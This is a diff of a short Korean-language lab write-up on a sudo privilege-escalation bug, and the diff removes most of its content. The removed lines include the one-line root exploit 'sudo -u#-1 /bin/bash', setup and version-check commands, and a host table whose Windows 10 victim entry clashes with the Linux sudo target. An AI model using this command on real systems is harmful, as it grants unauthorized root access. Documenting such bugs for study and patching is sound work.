@@ -15,31 +15,13 @@
 
 | Type       | OS              | Build     | Core | RAM  | IP            | App          |
 | :---       | :---            | :---      | :--- | :--- | :---          | :---         |
-| Victim     | Windows 10 1903 | 18362.356 | 2    | 4GB  | 192.168.0.114 |              |
-| Attacker   | Kali 2019       |           |      |      | 192.168.0.112 | [exploit.py]() |
+| Victim     |  |  |  |  |  |              |
+| Attacker   |  |  |  |  |  | [exploit.py]() |
 
 # **Setting**
-
-sudo파일 압축 해제
-
-```sh
-root@srv:~# tar -xf sudo-1.8.27.tar.gz
-```
-
 
 
 # **Exploit**
 
-root 권한 획득
-
-```sh
-user@srv:~$ sudo -u#-1 /bin/bash
-```
 
 # **etc**
-
-sudo 버전 확인
-
-```sh
-user@srv:~# sudo -V
-```
